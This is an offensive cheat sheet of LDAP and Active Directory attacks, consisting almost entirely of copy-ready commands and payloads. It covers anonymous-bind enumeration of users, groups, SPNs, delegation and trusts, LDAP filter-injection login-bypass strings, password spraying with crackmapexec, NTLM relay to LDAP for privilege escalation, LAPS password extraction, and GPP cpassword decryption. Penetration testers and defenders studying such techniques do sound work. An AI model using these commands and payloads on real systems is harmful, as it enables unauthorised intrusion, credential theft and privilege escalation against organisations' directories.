# LDAP Attacks

## 1. LDAP Enumeration
```bash
# Anonymous bind
ldapsearch -x -H ldap://target -b "DC=domain,DC=com"
ldapsearch -x -H ldap://target -b "DC=domain,DC=com" "(objectClass=*)"
# Users
ldapsearch -x -H ldap://target -b "DC=domain,DC=com" "(objectClass=user)" sAMAccountName
# Groups
ldapsearch -x -H ldap://target -b "DC=domain,DC=com" "(objectClass=group)" cn
# Computers
ldapsearch -x -H ldap://target -b "DC=domain,DC=com" "(objectClass=computer)" cn
```

## 2. LDAP Injection
```bash
# Filter injection
(&(uid=admin)(password=*))
(&(uid=admin)(password=*))
(&(uid=admin))(|(uid=*)(password=*))(&(uid=admin)(password=*))
# Login bypass
admin)(&)
admin)(!(&(objectClass=*))
*)(uid=*))(|(uid=*
```

## 3. Password Spraying
```bash
crackmapexec ldap target -u users.txt -p 'Password1'
ldapsearch -x -H ldap://target -D "CN=user,CN=Users,DC=domain,DC=com" -w password -b "DC=domain,DC=com"
```

## 4. LDAP Relay
```bash
# NTLM relay to LDAP
impacket-ntlmrelayx -t ldap://dc --escalate-user user
```

## 5. Password Extraction
```bash
# If LAPS
ldapsearch -x -H ldap://target -b "DC=domain,DC=com" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd
```

## 6. User Hunting
```bash
# Find users with admin access
ldapsearch -x -H ldap://target -b "DC=domain,DC=com" "(&(objectClass=user)(adminCount=1))"
```

## 7. SPN Discovery
```bash
ldapsearch -x -H ldap://target -b "DC=domain,DC=com" "(&(objectClass=user)(servicePrincipalName=*))" servicePrincipalName
```

## 8. Delegation Discovery
```bash
ldapsearch -x -H ldap://target -b "DC=domain,DC=com" "(msDS-AllowedToDelegateTo=*)" msDS-AllowedToDelegateTo
```

## 9. Trust Enumeration
```bash
ldapsearch -x -H ldap://target -b "CN=System,DC=domain,DC=com" "(objectClass=trustedDomain)"
```

## 10. GPP Passwords
```bash
# Find cpassword in SYSVOL
find /path/to/SYSVOL -name "*.xml" -exec grep -l "cpassword" {} \;
# Decrypt
gpp-decrypt cpassword_value
```
